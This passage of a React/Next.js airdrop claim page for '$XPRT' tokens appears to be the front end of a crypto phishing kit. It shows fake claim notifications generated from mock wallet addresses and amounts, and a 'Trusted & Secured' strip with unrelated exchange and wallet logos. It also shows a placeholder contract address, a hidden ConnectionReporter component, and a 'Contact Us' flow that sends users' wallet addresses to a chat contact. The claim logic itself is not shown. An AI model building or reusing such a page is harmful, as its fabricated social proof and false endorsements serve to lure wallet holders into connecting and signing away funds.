                const randomAmount = mockAmounts[Math.floor(Math.random() * mockAmounts.length)];
                setCurrentNotification({ id: Date.now(), address: randomAddress, amount: randomAmount });
            }, delay);
        };

        scheduleNotification();
        
        return () => clearTimeout(timerId);
    }, [mockAddresses, mockAmounts, currentNotification]);
    
    // --- Render Helpers ---
    interface StatusContent {
        icon: React.ReactNode;
        title: React.ReactNode;
        subtitle: React.ReactNode;
    }

    const getStatusContent = (): StatusContent | null => {
        if (!isConnected) {
            return null; 
        }

        // Don't show status until eligibility check is complete
        if (!eligibilityChecked) {
            return null;
        }

        if (isClaimed) {
            return {
                icon: (<Icon name="checkCircle" className="w-7 h-7 mx-auto text-green-600 dark:text-green-500 mb-2" />),
                title: (<p className="text-xl font-bold text-green-600 dark:text-green-500">CLAIMED!</p>),
                subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">You have successfully claimed your {airdropAmount}.</p>)
            };
        }
        if (isEligible) {
            return {
                icon: (<Icon name="rocket" className="w-7 h-7 mx-auto" color={primaryAccent} />),
                title: (<p className="text-xl font-bold" style={{ color: primaryAccent }}>YOU ARE ELIGIBLE!</p>),
                subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">Amount: <span className="font-semibold">{airdropAmount} XPRT</span></p>)
            };
        }
        
        // Only show "NOT ELIGIBLE" after check is complete
        return {
            icon: (<Icon name="xCircle" className="w-7 h-7 mx-auto text-red-600 dark:text-red-500 mb-2" />),
            title: (<p className="text-xl font-bold text-red-600 dark:text-red-500">NOT ELIGIBLE</p>),
            subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">Check the official criteria on our docs page.</p>)
        };
    };

    const getClaimButtonProps = useCallback((): ButtonProps | null => {
        if (isClaimed) {
            return null; 
        }

        if (!isConnected) {
            return {
                text: 'Connect Wallet',
                disabled: false,
                className: `bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-200 hover:bg-gray-300 dark:hover:bg-gray-600`,
                onClick: connectWallet,
                title: 'Connect your wallet to proceed'
            };
        }
        
        // Only show "Checking..." if connected AND eligibility not yet checked
        if (isConnected && !eligibilityChecked) {
            return {
                text: 'Checking...',
                disabled: true,
                className: 'bg-gray-400 text-gray-200 cursor-not-allowed animate-pulse',
                onClick: () => {},
                title: 'Checking eligibility...'
            };
        }
        
        if (isLoading) {
            return {
                text: 'Processing...',
                disabled: true,
                className: 'bg-blue-500 text-white cursor-not-allowed animate-pulse',
                onClick: () => {},
                title: 'Transaction in progress'
            };
        }
        
        if (isEligible) {
            return {
                text: 'Claim Now',
                disabled: false,
                className: `bg-blue-600 hover:bg-blue-700 text-white font-extrabold shadow-xl transition-shadow duration-300`, 
                onClick: claimAirdrop
            };
        }
        return {
            text: 'Contact Us',
            disabled: false,
            className: 'bg-gray-800 hover:bg-gray-900 text-white flex items-center justify-center gap-2',
            onClick: () => {
                const baseUrl = process.env.NEXT_PUBLIC_CONTACT_URL || '#';
                if (!baseUrl || baseUrl === '#') return;

                const walletPart = (isConnected && address) ? `\nWallet: ${address}` : '';
                const msg = `Hey! I wasn’t eligible for the airdrop. What can I do? Can you check my wallet or explain how I can qualify for it?${walletPart}`;
                const hasQuery = baseUrl.includes('?');

                let finalUrl = baseUrl;
                const lower = baseUrl.toLowerCase();

                if (lower.startsWith('mailto:')) {
                    finalUrl = `${baseUrl}${hasQuery ? '&' : '?'}subject=${encodeURIComponent('Airdrop Eligibility Help')}&body=${encodeURIComponent(msg)}`;
                } else if (lower.includes('wa.me') || lower.includes('api.whatsapp.com')) {
                    finalUrl = `${baseUrl}${hasQuery ? '&' : '?'}text=${encodeURIComponent(msg)}`;
                } else if (lower.includes('t.me') || lower.includes('telegram.me')) {
                    // Telegram deep-links commonly use start param; use text if supported by bot/link handler
                    finalUrl = `${baseUrl}${hasQuery ? '&' : '?'}start=${encodeURIComponent(msg)}`;
                } else {
                    finalUrl = `${baseUrl}${hasQuery ? '&' : '?'}message=${encodeURIComponent(msg)}`;
                }

                window.open(finalUrl, '_blank', 'noopener,noreferrer');
            },
            title: 'Get help via chat'
        };
    }, [isClaimed, isConnected, eligibilityChecked, isLoading, isEligible, claimAirdrop, connectWallet]);

    const statusContent = getStatusContent(); 
    const claimButtonProps = getClaimButtonProps();

    // Prevent hydration mismatch by using a consistent initial state
    const [isHydrated, setIsHydrated] = useState(false);
    
  useEffect(() => {
        setIsHydrated(true);
    }, []);

    const formattedAddress: string = isHydrated && isConnected && address
        ? `${address.substring(0, 6)}...${address.substring(address.length - 4)}` 
        : 'Connect Wallet';

    const walletIconColor: string = isConnected 
        ? (theme === 'dark' ? 'white' : primaryAccent) 
        : (theme === 'dark' ? 'gray' : 'black'); 

    const messageClasses: string = message ? {
        info: `bg-blue-50 dark:bg-blue-900/50 text-blue-700 dark:text-blue-300 border border-blue-300 dark:border-blue-700`,
        success: `bg-green-50 dark:bg-green-900/50 text-green-700 dark:text-green-300 border border-green-300 dark:border-green-700`,
        error: `bg-red-50 dark:bg-red-900/50 text-red-700 dark:text-red-300 border border-red-300 dark:border-red-700`
    }[message.type] : '';

    return (
        <div 
            className="min-h-screen flex flex-col transition-colors duration-500 relative overflow-x-hidden overflow-y-auto text-gray-900 dark:text-gray-200" 
            style={{ 
                fontFamily: 'Inter, sans-serif',
                backgroundColor: theme === 'dark' ? darkBackground : lightBackground
            }}
        >
            <style jsx global>{`
                .perspective-1000 { perspective: 1000px; }
                .transform-gpu { transform-style: preserve-3d; }
                
                @keyframes pulse-accent {
                    0%, 100% { box-shadow: 0 0 10px rgba(59, 130, 246, 0.4); } 
                    50% { box-shadow: 0 0 20px rgba(59, 130, 246, 0.7), 0 0 5px rgba(59, 130, 246, 0.2); }
                }
                .animate-accent-pulse {
                    animation: pulse-accent 4s infinite ease-in-out;
                }
                .video-state {
                    position: relative;
                    overflow: hidden;
                }
                .text-2xs { font-size: 0.65rem; }
                html, body {
                    height: 100%;
                    margin: 0;
                    padding: 0;
                    transition: background-color 0.5s ease;
                }
            `}</style>

            <GeometricBackground theme={theme} />
            <ConnectionReporter />
            
            <header className={`fixed top-0 left-0 w-full z-30 backdrop-blur-sm shadow-lg border-b transition-colors duration-500 ${
                theme === 'dark' 
                    ? 'bg-neutral-900/95 border-neutral-800' 
                    : 'bg-white/95 border-gray-200'
            }`}>
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3 flex justify-between items-center">
                    <div className="flex items-center space-x-2 min-w-0">
                        <div className="relative">
                            <Icon name="gem" className="w-7 h-7" color={primaryAccent} />
                            <div className="absolute inset-0 bg-gradient-to-r from-blue-400 to-purple-500 rounded-full blur-sm opacity-30 animate-pulse"></div>
                        </div>
                        <span className="text-xl sm:text-2xl font-extrabold tracking-wide relative max-w-[45vw] overflow-hidden text-ellipsis whitespace-nowrap">
                            <span className={`bg-gradient-to-r bg-clip-text text-transparent ${
                                theme === 'dark' 
                                    ? 'from-gray-200 via-gray-100 to-gray-200' 
                                    : 'from-gray-800 via-gray-700 to-gray-800'
                            }`}>
                                Protocol
                            </span>
                            <span className="ml-1 bg-gradient-to-r from-blue-500 via-purple-500 to-blue-600 bg-clip-text text-transparent font-black text-2xl sm:text-3xl">
                                X
                            </span>
                            <span className="absolute -top-1 -right-1 w-2 h-2 bg-gradient-to-r from-blue-400 to-purple-500 rounded-full animate-pulse"></span>
                        </span>
                    </div>

                    <div className="flex items-center space-x-3 flex-shrink-0">
                        <button onClick={toggleTheme} className="p-2 rounded-full transition-colors duration-200 hover:bg-gray-200 dark:hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" aria-label="Toggle theme">
                            <Icon 
                                name={theme === 'dark' ? 'sun' : 'moon'} 
                                className={`w-5 h-5 transition-colors duration-300 ${
                                    theme === 'dark' 
                                        ? 'text-yellow-500 hover:text-yellow-400' 
                                        : 'text-slate-700 hover:text-slate-600'
                                }`} 
                            />
                        </button>
                        
                        <div className="relative group">
                            <motion.button 
                                onClick={() => isConnected ? disconnectWallet() : connectWallet()}
                                whileHover={{ scale: 1.05, boxShadow: '0 5px 10px rgba(0, 0, 0, 0.3)' }}
                                whileTap={{ scale: 0.95 }}
                                className={`font-semibold py-2 px-4 rounded-full shadow-md transition-all duration-300 transform flex items-center space-x-2 text-sm whitespace-nowrap
                                    ${isConnected 
                                        ? 'bg-white dark:bg-gray-700 hover:bg-gray-100 dark:hover:bg-gray-600 text-gray-800 dark:text-gray-200 border border-gray-300 dark:border-gray-600' 
                                        : 'bg-blue-600 hover:bg-blue-700 text-white font-bold'
                                    }`}
                            >
                                <Icon name="wallet" className="w-5 h-5" color={isConnected ? walletIconColor : 'white'} />
                                <span id="walletConnectText" className="max-w-[38vw] sm:max-w-none overflow-hidden text-ellipsis whitespace-nowrap">{formattedAddress}</span>
                            </motion.button>
                            
                            {/* MetaMask Installation Hint */}
                            {!isConnected && (
                                <div className="absolute top-full left-1/2 transform -translate-x-1/2 mt-2 px-3 py-2 bg-gray-900 text-white text-xs rounded-lg opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap z-50">
                                    Need MetaMask? 
                                    <a 
                                        href="https://metamask.io/download/" 
                                        target="_blank" 
                                        rel="noopener noreferrer"
                                        className="text-blue-400 hover:text-blue-300 underline ml-1"
                                    >
                                        Install here
                                    </a>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
                {/* News Ticker */}
                <NewsTicker theme={theme} />
            </header>

            <main className="flex-grow flex justify-center p-4 relative z-10 pt-28">
                <div className="w-full max-w-4xl space-y-12"> 
                    
                    <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ duration: 0.5 }}
                        className="max-w-sm mx-auto perspective-1000"
                    >
                        <motion.div 
                            whileHover={{ 
                                y: -5, 
                                scale: 1.02, 
                                boxShadow: '0 20px 40px rgba(0,0,0,0.6), 0 10px 20px rgba(59, 130, 246, 0.3)', 
                                transition: { duration: 0.3 } 
                            }}
                            className={`rounded-xl border transition-all duration-500 ${
                                theme === 'dark' 
                                    ? 'bg-neutral-900 border-neutral-800 shadow-2xl shadow-blue-500/30 animate-accent-pulse' 
                                    : 'bg-white border-gray-200 shadow-[0_8px_30px_rgb(0,0,0,0.12)] shadow-gray-900/30'
                            }`}
                        > 
                            
                            <MediaContainer 
                                mediaState={mediaState} 
                                isConnected={isConnected} 
                                primaryAccent={primaryAccent} 
                            />
                            
                            <div className="px-5 pb-5 pt-4"> 
                                <h1 className="text-2xl font-extrabold mb-1 text-center" style={{ color: primaryAccent }}>X-Genesis Airdrop</h1>
                                <p className="text-center text-gray-600 dark:text-gray-400 mb-6 text-sm">Secure your $XPRT tokens now! Connect your wallet to check eligibility.</p>

                                {statusContent && (
                                    <div className="text-center mb-6 p-4 rounded-lg border border-dashed border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-800/80 transition-colors duration-500 text-gray-900 dark:text-white">
                                        {statusContent.icon}
                                        {statusContent.title}
                                        {statusContent.subtitle}
                                    </div>
                                )}
                                
                                {message && (
                                    <div className={`mb-4 p-3 rounded-lg text-sm text-center font-medium ${messageClasses}`}>
                                        {message.text}
                                    </div>
                                )}

                                {claimButtonProps && (
                                    <button 
                                        type="button"
                                        onClick={(e) => {
                                            e.preventDefault();
                                            e.stopPropagation();
                                            if (!claimButtonProps.disabled) {
                                                claimButtonProps.onClick();
                                            }
                                        }}
                                        disabled={claimButtonProps.disabled} 
                                        title={claimButtonProps.title}
                                        style={{ pointerEvents: 'auto' }}
                                        className={`w-full text-base font-semibold py-3 px-5 rounded-xl transition-all duration-200 active:scale-95 relative z-10 ${claimButtonProps.className}`}
                                    >
                                        <span className="inline-flex items-center gap-2">
                                            {claimButtonProps.text === 'Contact Us' && (
                                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 10h.01M12 10h.01M16 10h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4-.8L3 20l.8-4A7.5 7.5 0 113 12" />
                                                </svg>
                                            )}
                                            <span>{claimButtonProps.text}</span>
                                        </span>
                                    </button>
                                )}
                            </div>
                        </motion.div>
                    </motion.div>

                    <div className="text-center pt-4">
                        <h2 className="text-2xl font-extrabold mb-6 transition-colors duration-500">
                            <span className="bg-gradient-to-r from-purple-600 via-blue-500 to-cyan-500 bg-clip-text text-transparent">Explore Future Opportunities</span>
                        </h2>
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                        <UpcomingCard 
                            iconName="rocket" 
                            iconColor="#fcd34d" 
                            title="$GAMMA Protocol" 
                            snapshot="Q1 2026" 
                            eligibility="XPRT Stakers"
                            primaryAccent={primaryAccent}
                            theme={theme}
                        />
                        <UpcomingCard 
                            iconName="users2" 
                            iconColor={primaryAccent} 
                            title="$BETA Treasury" 
                            snapshot="Jan 1st, 2026" 
                            eligibility="Active Governance"
                            primaryAccent={primaryAccent}
                            theme={theme}
                        />
                        <UpcomingCard 
                            iconName="layoutGrid" 
                            iconColor="#a78bfa" 
                            title="$OMEGA Ecosystem" 
                            snapshot="TBD" 
                            eligibility="LP Providers V3"
                            primaryAccent={primaryAccent}
                            theme={theme}
                        />
                    </div>
                    
                    <div className="py-6 px-4 sm:px-8">
                        <p className="text-center text-sm font-semibold uppercase tracking-widest mb-6 transition-colors duration-500">
                            <span className="bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">Trusted & Secured</span>
                            <span className="text-gray-400 dark:text-gray-600"> with Leading Web3 Partners</span>
                        </p>
                        <div className="flex flex-wrap justify-center items-center gap-x-10 gap-y-6 transition-opacity duration-500">
                            
                            <div className="flex items-center space-x-3 group">
                                <Image 
                                    src="/metamask-icon.svg" 
                                    alt="MetaMask" 
                                    width={36}
                                    height={36}
                                    className="w-8 h-8 sm:w-9 sm:h-9 object-contain group-hover:scale-110 transition-all duration-300" 
                                />
                                <span className="text-base sm:text-lg font-bold text-gray-500 dark:text-gray-400 group-hover:text-orange-500 dark:group-hover:text-orange-400 transition-colors duration-300 hidden sm:block">MetaMask</span>
                            </div>
                            
                            <div className="flex items-center space-x-3 group">
                                <Image 
                                    src="/Uniswap_icon_pink.svg" 
                                    alt="Uniswap" 
                                    width={36}
                                    height={36}
                                    className="w-8 h-8 sm:w-9 sm:h-9 object-contain group-hover:scale-110 transition-all duration-300" 
                                />
                                <span className="text-base sm:text-lg font-bold text-gray-500 dark:text-gray-400 group-hover:text-pink-500 dark:group-hover:text-pink-400 transition-colors duration-300 hidden sm:block">Uniswap</span>
                            </div>

                            <div className="flex items-center space-x-3 group">
                                <Image 
                                    src="/binance.svg" 
                                    alt="Binance" 
                                    width={36}
                                    height={36}
                                    className="w-8 h-8 sm:w-9 sm:h-9 object-contain group-hover:scale-110 transition-all duration-300" 
                                />
                                <span className="text-base sm:text-lg font-bold text-gray-500 dark:text-gray-400 group-hover:text-yellow-500 dark:group-hover:text-yellow-400 transition-colors duration-300 hidden sm:block">Binance</span>
                            </div>
                            
                            <div className="flex items-center space-x-3 group">
                                <Image 
                                    src="/solana.svg" 
                                    alt="Solana" 
                                    width={36}
                                    height={36}
                                    className="w-8 h-8 sm:w-9 sm:h-9 object-contain group-hover:scale-110 transition-all duration-300" 
                                />
                                <span className="text-base sm:text-lg font-bold text-gray-500 dark:text-gray-400 group-hover:text-purple-600 dark:group-hover:text-purple-500 transition-colors duration-300 hidden sm:block">Solana</span>
                            </div>
                        </div>
                    </div>

                    <div className="text-center mt-6 text-xs text-gray-500 dark:text-gray-500 transition-colors duration-500">
                        Network: {chainId ? CHAIN_NAMES[chainId] || "Unknown" : "Not Connected"} | Contract: 0x...A1B2C3
                    </div>
                </div>
            </main>

            <footer className="relative z-10 py-4 text-center text-xs text-gray-500 dark:text-gray-400 border-t border-gray-200 dark:border-neutral-800 bg-white/95 dark:bg-neutral-900/95 backdrop-blur-sm shadow-inner-xl shadow-gray-900/10 dark:shadow-blue-500/20 transition-colors duration-500">
                &copy; 2025 Protocol X. All Rights Reserved.
            </footer>

            <div id="notificationContainer" className="fixed bottom-6 left-4 md:bottom-6 md:left-4 z-40 w-full max-w-[14rem] sm:max-w-xs flex flex-col items-start pointer-events-none p-3 md:p-0">
                {currentNotification && (
                    <NotificationToast 
                        key={currentNotification.id} 
                        address={currentNotification.address} 
                        amount={currentNotification.amount} 
                        onClose={removeNotification} 
                        primaryAccent={primaryAccent}
                    />
                )}
            </div>

            {/* Floating AI Chat Button */}
            <motion.button
                onClick={() => setIsAIChatOpen(true)}
                className="fixed bottom-6 right-6 z-40 p-4 bg-gradient-to-r from-blue-500 to-purple-500 rounded-full shadow-lg hover:shadow-xl transition-all duration-300 group"
                whileHover={{ scale: 1.1 }}
                whileTap={{ scale: 0.95 }}
                initial={{ opacity: 0, scale: 0 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ delay: 1, type: "spring", stiffness: 200 }}
                aria-label="Ask Alex - AI Assistant"
            >
                <div className="flex items-center space-x-2">
                    <div className="w-6 h-6 bg-white rounded-full flex items-center justify-center">
                        <span className="text-blue-500 font-bold text-sm">AI</span>
                    </div>
                    <span className="text-white font-semibold text-sm hidden sm:block">Ask Alex</span>
                </div>
                
                {/* Pulse indicator */}
                <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
                
                {/* Tooltip */}
                <div className="absolute bottom-full right-0 mb-2 px-3 py-2 bg-gray-900 text-white text-xs rounded-lg opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap">
                    Ask Alex anything about airdrops!
                </div>
            </motion.button>

            {/* AI Components */}
            <AIChat 
                isOpen={isAIChatOpen} 
                onClose={() => setIsAIChatOpen(false)} 
            />
            
            {selectedAirdrop && (
                <AirdropDetailsPopup
                    isOpen={isAirdropPopupOpen}
                    onClose={() => {
                        setIsAirdropPopupOpen(false);
                        setSelectedAirdrop(null);
                    }}
                    airdrop={selectedAirdrop}
                />
            )}
        </div>
    );
};

// --- News Ticker ---
const NewsTicker: React.FC<{ theme: Theme }> = ({ theme }) => {
    const [items, setItems] = useState<string[]>([]);
    useEffect(() => {
        let active = true;
        (async () => {
            try {
                const res = await fetch('/api/airdrop-news', { cache: 'no-store' });
                const json = await res.json();
                if (active && json?.items) setItems(json.items);
            } catch {
                if (active) setItems([]);
            }
        })();
        return () => { active = false; };
    }, []);

    if (!items.length) return null;

    return (
        <div className={`overflow-hidden border-t ${theme === 'dark' ? 'border-neutral-800' : 'border-gray-200'}`}>
            <div className="relative whitespace-nowrap ticker">
                <div
                    className="inline-block animate-marquee will-change-transform py-2"
                    style={{ minWidth: '100%' }}
                >
                    {items.map((t, i) => (
                        <span
                          key={i}
                          className={`mx-4 inline-flex items-center gap-2 px-3 py-1.5 rounded-full border shadow-sm hover:shadow-md transition-transform duration-200 hover:-translate-y-0.5 ${theme === 'dark' ? 'bg-neutral-900/70 border-neutral-700 text-gray-200' : 'bg-white/70 border-gray-200 text-gray-700'}`}
                          style={{ backdropFilter: 'blur(6px)' }}
                        >
                          <span className="relative inline-flex items-center justify-center">
                            <span className="w-2 h-2 rounded-full bg-gradient-to-r from-blue-500 to-purple-500"></span>
                            <span className="absolute inline-flex w-3.5 h-3.5 rounded-full animate-ping-slow bg-blue-500/40"></span>
                          </span>
                          <span className="font-medium text-[0.8rem] sm:text-sm whitespace-nowrap">{t}</span>
                        </span>
                    ))}
                </div>
                <div
                    className="inline-block animate-marquee will-change-transform py-2"
                    style={{ minWidth: '100%' }}
                >
                    {items.map((t, i) => (
                        <span
                          key={`dup-${i}`}
                          className={`mx-4 inline-flex items-center gap-2 px-3 py-1.5 rounded-full border shadow-sm hover:shadow-md transition-transform duration-200 hover:-translate-y-0.5 ${theme === 'dark' ? 'bg-neutral-900/70 border-neutral-700 text-gray-200' : 'bg-white/70 border-gray-200 text-gray-700'}`}
                          style={{ backdropFilter: 'blur(6px)' }}
                        >
                          <span className="relative inline-flex items-center justify-center">
                            <span className="w-2 h-2 rounded-full bg-gradient-to-r from-blue-500 to-purple-500"></span>
                            <span className="absolute inline-flex w-3.5 h-3.5 rounded-full animate-ping-slow bg-purple-500/40"></span>
                          </span>
                          <span className="font-medium text-[0.8rem] sm:text-sm whitespace-nowrap">{t}</span>
                        </span>
                    ))}
                </div>
            </div>
            <style jsx>{`
                @keyframes marquee {
                    0% { transform: translateX(0); }
                    100% { transform: translateX(-100%); }
                }
                .animate-marquee { animation: marquee 60s linear infinite; }
                /* slower on small screens */
                @media (max-width: 640px) {
                  .animate-marquee { animation-duration: 90s; }
                }
                /* pause on hover */
                .ticker:hover .animate-marquee { animation-play-state: paused; }
                /* respect reduced motion */
                @media (prefers-reduced-motion: reduce) {
                  .animate-marquee { animation: none; }
                }
                @keyframes ping-slow { 
                  0% { transform: scale(0.9); opacity: 0.6; } 
                  70% { transform: scale(1.6); opacity: 0; } 
                  100% { transform: scale(1.6); opacity: 0; }
                }
                .animate-ping-slow { animation: ping-slow 2s cubic-bezier(0, 0, 0.2, 1) infinite; }
            `}</style>
        </div>
    );
};

export default App;
  